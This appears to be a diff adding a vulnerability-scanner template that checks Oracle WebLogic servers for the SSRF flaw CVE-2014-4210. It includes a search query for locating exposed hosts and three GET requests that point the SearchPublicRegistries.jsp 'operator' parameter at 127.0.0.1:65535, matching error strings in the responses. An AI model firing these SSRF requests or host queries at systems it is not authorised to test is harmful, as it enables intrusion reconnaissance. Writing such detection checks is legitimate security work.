@@ -1,0 +1,38 @@
+name: Oracle Weblogic SearchPublicRegistries.jsp SSRF CVE-2014-4210
+manual: true
+query: title="Search public registries" || port="7001" || body="Search public registries"
+  || app="Oracle-WeblogicPortal" || app="Oracle-Weblogic_interface_7001" || app="Oracle-BEA-WebLogic-Server"
+  || title=="Error 404--Not Found"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:65535&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
+    expression: response.status == 200 && response.body.bcontains(b"but could not
+      connect over HTTP to server")
+  r1:
+    request:
+      method: GET
+      path: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:65535&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
+    expression: response.status == 200 && response.body.bcontains(b"returned a 404
+      error code")
+  r2:
+    request:
+      method: GET
+      path: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:65535&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
+    expression: response.status == 200 && response.body.bcontains(b"did not have a
+      valid  SOAP content-type")
+expression: r0() || r1() || r2()
+detail:
+  links:
+  - https://www.oracle.com/security-alerts/cpujul2014.html
+  - https://nvd.nist.gov/vuln/detail/CVE-2014-4210
+  - https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html
+  description: Oracle WebLogic Server is the industry leading application server for
+    building enterprise applications using Java EE standards, and deploying them on
+    a reliable, scalable runtime with low cost of ownership. It is strategically integrated
+    with Oracle’s full product and cloud service portfolio. Oracle WebLogic Server
+    provides compatibility with prior versions, and supports new features for developer
+    productivity, high availability, manageability and deployment to cloud native
+    Kubernetes-based environments.
